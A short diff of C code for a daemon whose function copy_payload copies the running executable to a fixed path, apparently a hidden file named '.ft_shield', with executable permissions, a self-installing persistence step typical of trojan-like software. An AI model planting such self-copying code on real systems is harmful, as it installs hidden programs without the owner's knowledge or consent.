@@ -20,11 +20,9 @@ t_daemon *create_daemon( void ) {
 			 Daemon() returns -1 and sets errno to any of the errors specified
 			 for the fork(2) and setsid(2). */
 
-void copy_payload(void) {
+void copy_payload(char *curdir) {
 	if (access(EXECUTABLE_FILE, F_OK) != 0) {
-		// TODO Execute from a different path
-		// example ./some/other/path/.ft_shield
-		int in_fd = open(EXECUTABLE_NAME, O_RDONLY);
+		int in_fd = open(curdir, O_RDONLY);
 		int out_fd = open(EXECUTABLE_FILE, O_WRONLY | O_TRUNC | O_CREAT, 0755);
 		if (in_fd < 0 || out_fd < 0) {
 			//logger.log_entry("Error copying executable", "ERROR");
